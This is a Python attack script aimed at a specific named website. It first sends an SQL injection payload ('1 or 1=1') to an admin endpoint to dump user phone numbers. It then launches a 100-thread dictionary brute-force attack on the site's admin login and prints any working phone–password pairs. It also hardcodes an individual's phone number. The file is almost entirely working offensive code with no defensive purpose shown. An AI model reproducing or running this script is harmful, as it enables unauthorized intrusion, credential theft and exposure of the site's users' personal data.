import requests
import os
import sys
import threading
import time
import queue
import datetime
from requests.packages.urllib3 import disable_warnings
path = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.append(path)
from lib.get_user_agent import get_user_agent

disable_warnings()

class password_blasting:
    def __init__(self, url=None, password_file=None, data=None):
        self.url = url
        self.password_file = open(password_file, 'r', encoding="utf-8").readlines()
        self.data = data
        self.__stop = 0
        self.count = 0
        self.length = []
        self.password = []
        self.q_user = queue.Queue()

    def user(self):
        url_user = 'https://dingdaer.hnyintao.cn/admin/user/getTopFuns'
        data = {
            "uid": "1 or 1=1"
        }
        resulr = requests.post(url=url_user, data=data)
        resulr.encoding = "utf-8"
        for i in range(len(resulr.json()["data"])):
            self.q_user.put(resulr.json()["data"][i]["phone"])
        # print(resulr.json()["data"][1]["phone"])

    def password_blasting(self):
        while True:
            self.count += 1
            user = self.q_user.get()
            for passwd in self.password_file:
                data = {
                    "phone": user,
                    "pwd": passwd.strip('\n')
                }
                # print(f"\r字典已爆破进度：{self.count}", end="")
                # print(f"\r正在爆破：账号：{user} => 密码：{passwd}", end="")
                result_post = requests.post(self.url, data=data, verify=False, timeout=5)
                result_post.encoding = 'utf-8'
                if result_post.json()["msg"] != "密码错误":
                    print(f"账号：{user} => 密码：{passwd}")
                    print(result_post.json())
            if self.q_user.qsize() == 0:
                self.__stop += 1
                break

    def password_main(self):
        print("""
                                                            .___   ___.   .__                   __
___________    ______ ________  _  _____________  __| _/   \_ |__ |  | _____    _______/  |_
\____ \__  \  /  ___//  ___/\ \/ \/ /  _ \_  __ \/ __ |     | __ \|  | \__  \  /  ___/\   __\\
|  |_> > __ \_\___ \ \___ \  \     (  <_> )  | \/ /_/ |     | \_\ \  |__/ __ \_\___ \  |  |
|   __(____  /____  >____  >  \/\_/ \____/|__|  \____ |_____|___  /____(____  /____  > |__|
|__|       \/     \/     \/                          \/_____/   \/          \/     \/
    """)
        self.user()
        t_list = []
        for i in range(100):
            t = threading.Thread(target=self.password_blasting, args=())
            t_list.append(t)
        for j in t_list:
            j.start()
        while 1:
            if self.__stop:
                time.sleep(0.5)
                for i in range(len(self.length)):
                    if self.length[0] != self.length[i]:
                        print("\n\r", end="")
                        print(f"\n[+] \033[1;36m 爆破成功，用户: \033[1;34m 13530045816\033[0m, 密码是\033[0m：\033[1;34m {self.password[i]}\033[0m")
                        break
                break
        end = datetime.datetime.now()
        print('\n本次爆破所使用的时间: %s Seconds\n' % (end - start))


if __name__ == "__main__":
    url = 'https://dingdaer.hnyintao.cn/admin/login'
    # username = 'admin'
    password_file = 'D:\Dictionary\Password\password.txt'
    start = datetime.datetime.now()
    passwd = password_blasting(url=url, password_file=password_file)
    passwd.password_main()

